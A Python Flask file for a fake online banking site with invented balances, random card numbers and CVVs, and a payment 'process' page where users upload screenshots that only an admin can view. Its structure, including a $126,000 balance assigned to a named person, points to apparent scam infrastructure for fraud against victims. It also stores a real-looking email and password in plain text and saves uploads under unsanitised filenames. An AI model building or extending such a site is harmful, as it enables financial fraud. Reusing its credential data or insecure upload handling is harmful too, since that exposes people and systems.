from flask import (
    Flask, render_template, request, redirect,
    session, url_for, flash, send_from_directory
)
from functools import wraps
import os
import random
from datetime import datetime

# -------------------------------
# APP SETUP
# -------------------------------
app = Flask(__name__)
app.secret_key = "dummy-secret"

BASE_DIR = os.getcwd()
UPLOAD_FOLDER = os.path.join(BASE_DIR, "uploads", "screenshots")
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

app.config["UPLOAD_FOLDER"] = UPLOAD_FOLDER

# Make session info available in all templates
@app.context_processor
def inject_user():
    return dict(
        logged_in="username" in session,
        user_role=session.get("role"),
        user_name=session.get("user")
    )
# -------------------------------
# CARD GENERATOR
# -------------------------------

def generate_card_number():
    return " ".join(
        str(random.randint(1000, 9999)) for _ in range(4)
    )

def generate_expiry():
    month = random.randint(1, 12)
    year = random.randint(datetime.now().year + 1, datetime.now().year + 6)
    return f"{month:02d}/{str(year)[-2:]}"

def generate_cvv():
    return str(random.randint(100, 999))

# -------------------------------
# USERS
# -------------------------------

USERS = [
    {
        "username": "demo",
        "password": "demo123",
        "name": "Wide Mind User",
        "accounts": [
            {
                "id": 1,
                "type": "Checking",
                "balance": 15240.75,
                "number": "****4821"
            },
            {
                "id": 2,
                "type": "Savings",
                "balance": 8240.50,
                "number": "****3950"
            },
        ],
        "transactions": {
            1: [
                {"desc": "POS Purchase - AMAZON", "amount": -250.00},
                {"desc": "Payment Received", "amount": 1500.00},
            ],
            2: [
                {"desc": "Interest Credited", "amount": 12.50},
                {"desc": "Deposit via Mobile", "amount": 500.00},
            ],
        }
    },
    {
        "username": "Salon454@yahoo.com",
        "password": "Michele123@",
        "name": "Michele Pfenninger",
        "accounts": [
            {
                "id": 1,
                "type": "Savings",
                "balance": 126000.75,
                "number": "***0462"
            },
        ],
        "transactions": {
            1: [
                {"desc": "POS Purchase - AMAZON", "amount": -250.00},
                {"desc": "Payment Received", "amount": 1500.00},
            ],
        }
    }
]

# -------------------------------
# AUTO-GENERATE CARD DATA
# -------------------------------

for user in USERS:
    for acc in user["accounts"]:
        acc["card_number"] = generate_card_number()
        acc["expiry"] = generate_expiry()
        acc["cvv"] = generate_cvv()

# -------------------------------
# ADMIN
# -------------------------------

ADMIN_USER = {
    "username": "admin",
    "password": "admin123",
    "name": "Admin"
}

# -------------------------------
# AUTH DECORATORS
# -------------------------------

def login_required(f):
    @wraps(f)
    def wrapped(*args, **kwargs):
        if "user" not in session:
            return redirect("/")
        return f(*args, **kwargs)
    return wrapped


def admin_required(f):
    @wraps(f)
    def wrapped(*args, **kwargs):
        if session.get("role") != "admin":
            return redirect("/accounts")
        return f(*args, **kwargs)
    return wrapped


# -------------------------------
# HELPER
# -------------------------------

def get_current_user():
    username = session.get("username")
    for user in USERS:
        if user["username"] == username:
            return user
    return None


# -------------------------------
# STATIC UPLOAD SERVING
# -------------------------------

@app.route("/uploads/<filename>")
def uploaded_file(filename):
    return send_from_directory(app.config["UPLOAD_FOLDER"], filename)


# -------------------------------
# AUTH ROUTES
# -------------------------------

@app.route("/")
def login():
    # Check if user is already logged in
    if "username" in session:
        role = session.get("role")
        if role == "admin":
            return redirect(url_for("uploads"))
        else:
            return redirect(url_for("accounts"))

    # Not logged in, show login page
    return render_template("login.html")


@app.route("/login", methods=["POST"])
def do_login():
    username = request.form["username"]
    password = request.form["password"]

    # Admin login
    if username == ADMIN_USER["username"] and password == ADMIN_USER["password"]:
        session["user"] = ADMIN_USER["name"]
        session["username"] = ADMIN_USER["username"]
        session["role"] = "admin"
        return redirect("/uploads")

    # Normal users
    for user in USERS:
        if username == user["username"] and password == user["password"]:
            session["user"] = user["name"]
            session["username"] = user["username"]
            session["role"] = "user"
            return redirect("/accounts")

    flash("Invalid login credentials")
    return redirect("/")


# -------------------------------
# USER ROUTES
# -------------------------------

@app.route("/accounts")
@login_required
def accounts():
    user = get_current_user()
    return render_template("accounts.html", accounts=user["accounts"])


@app.route("/accounts/<int:account_id>")
@login_required
def account_details(account_id):
    user = get_current_user()
    account = next((a for a in user["accounts"] if a["id"] == account_id), None)

    if not account:
        return "Account not found", 404

    transactions = user["transactions"].get(account_id, [])
    return render_template("account_details.html", account=account, transactions=transactions)


@app.route("/send", methods=["GET", "POST"])
@login_required
def send():
    banks_and_services = [
        "Bank of America", "Chase", "Wells Fargo",
        "Citi Bank", "US Bank", "Cash App",
        "Venmo", "PayPal"
    ]

    if request.method == "POST":
        return redirect(url_for("process"))

    return render_template("send.html", banks=banks_and_services)


# -------------------------------
# PAYMENT PROCESS
# -------------------------------

@app.route("/process", methods=["GET", "POST"])
@login_required
def process():
    main_bank_link = "gsbeybdtg227262553-y6bds63h3be88u3nnyhe"

    if request.method == "POST":
        file = request.files.get("screenshot")
        if file and file.filename:
            filename = file.filename
            file.save(os.path.join(app.config["UPLOAD_FOLDER"], filename))
            flash("Screenshot uploaded successfully!", "success")
        else:
            flash("No screenshot selected.", "info")

        return redirect(url_for("process"))

    return render_template("process.html", main_bank_link=main_bank_link)


# -------------------------------
# ADMIN IMAGE GALLERY
# -------------------------------

@app.route("/uploads")
@admin_required
def uploads():
    images = []

    for filename in os.listdir(app.config["UPLOAD_FOLDER"]):
        if filename.lower().endswith((".png", ".jpg", ".jpeg", ".webp")):
            images.append({
                "name": filename,
                "url": url_for("uploaded_file", filename=filename)
            })

    return render_template("uploads.html", images=images)


# -------------------------------
# CARDS PAGE
# -------------------------------

@app.route("/cards")
@login_required
def cards():
    user = get_current_user()
    cards = []

    for acc in user["accounts"]:
        cards.append({
            "brand": "Visa" if acc["id"] % 2 else "MasterCard",
            "number": acc["card_number"],
            "expiry": acc["expiry"],
            "cvv": acc["cvv"],
            "note": f"{acc['type']} Account Card"
        })

    return render_template("cards.html", cards=cards)


@app.route("/profile")
@login_required
def profile():
    return render_template(
        "profile.html",
        user=session.get("user")
    )


@app.route("/logout")
def logout():
    session.clear()
    return redirect("/")


# -------------------------------
# RUN
# -------------------------------
if __name__ == "__main__":
    app.run(debug=True)